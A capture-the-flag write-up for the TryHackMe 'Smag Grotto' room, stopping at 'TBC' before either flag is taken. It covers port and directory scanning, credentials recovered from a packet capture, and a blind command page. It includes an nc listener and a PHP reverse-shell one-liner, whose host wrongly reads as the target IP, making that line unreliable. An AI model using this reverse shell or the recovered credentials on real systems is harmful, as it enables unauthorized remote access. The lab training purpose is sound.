```
   oo_   \\\    ///           \/           \/    ))       .-.  (o)__(o)(o)__(o)  .-.     
  /  _)-<((O)  (O))   /)     (OO)         (OO)  (Oo)-.  c(O_O)c(__  __)(__  __)c(O_O)c   
  \__ `.  | \  / |  (o)(O) ,'.--.)      ,'.--.)  | (_)),'.---.`, (  )    (  ) ,'.---.`,  
     `. | ||\\//||   //\\ / /|_|_\     / /|_|_\  |  .'/ /|_|_|\ \ )(      )( / /|_|_|\ \ 
     _| | || \/ ||  |(__)|| \_.--.     | \_.--.  )|\\ | \_____/ |(  )    (  )| \_____/ | 
  ,-'   | ||    ||  /,-. |'.   \) \    '.   \) \(/  \)'. `---' .` )/      )/ '. `---' .` 
 (_..--' (_/    \_)-'   ''  `-.(_.'      `-.(_.' )      `-...-'  (       (     `-...-'
```
Follow the yellow brick road. [^1]

What is the user flag?
-----------------------------------------------------------------------------------------
Upon accessing the website, we are informed, that the website is still heavily under
development and that we should check back soon to see the awesome services they offer.
Using `nmap -sV -p- <TARGET_IP_ADDRESS>` we were able, to discover two open ports.
Namely, `ssh` on port *22* and `http` on port *80* which we already discovered. We still
suspect there to be a hidden entry on the HTTP page. Therefore, we start a `gobuster`
query to find hidden pages.
```
gobuster dir --url <URL_ADDRESS> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 64
```
And indeed, therefore we find the `/mail` and `/server-status` pages that are of especial
interest to us. We begin, by investigating the `/mail` endpoint and are informed that
the applications implements the *email2web* software to view emails in a hassle free way
and that all attachments must be downloaded with `wget`. Additionally, the *Network
Mitigation* email reply includes a PCAP file documenting a network change. So, we proceed
to investigate the `dHJhY2Uy.pcap` file and find only ten packets. Packet four, in
particular gives us useful information about a `/login.php` page with sensitive user
credentials as follows in an excerpt from the HTTP protocol and form data.
```
Hypertext Transfer Protocol
    POST /login.php HTTP/1.1\r\n
    Host: development.smag.thm\r\n
    <--snip-->
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "username" = "helpdesk"
    Form item: "password" = "cH4nG3M3_n0w"
```
Note, that before we can access the server `http://development.smag.thm/login.php`, we
first need to edit the `/etc/hosts` file to include the following entry with the
`<TARGET_IP_ADDRESS> development.smag.thm` IP address mapping. Having done, this we can
now navigate to the login page and enter the credentials from the packet capture.
This then redirects us to the `/admin.php` page where we can enter a command of our
choice and send it to the server. However, we have a *blind shell* because the output of
the command that we enter can not be seen directly. Instead, we want to start a listening
server on our attacking machine with `nc -lnvp 4444` and then wait for an incoming
request from the target server. To connect to our attacking machine, we can use a reverse
shell like the following which we generated using [^2].
```php
php -r '$sock=fsockopen("<TARGET_IP_ADDRESS>",<PORT>);system("sh <&3 >&3 2>&3");'
```
Thust, we get a reverse shell connection on our listener and are able to enter commands.
Navigating the home directory, we discover a user *jake* with a `user.txt` file.
However, we can not access it because we are logged in as *www-data*.

TBC

What is the root flag?
-----------------------------------------------------------------------------------------

[^1]: https://tryhackme.com/room/smaggrotto
[^2]: https://www.revshells.com/
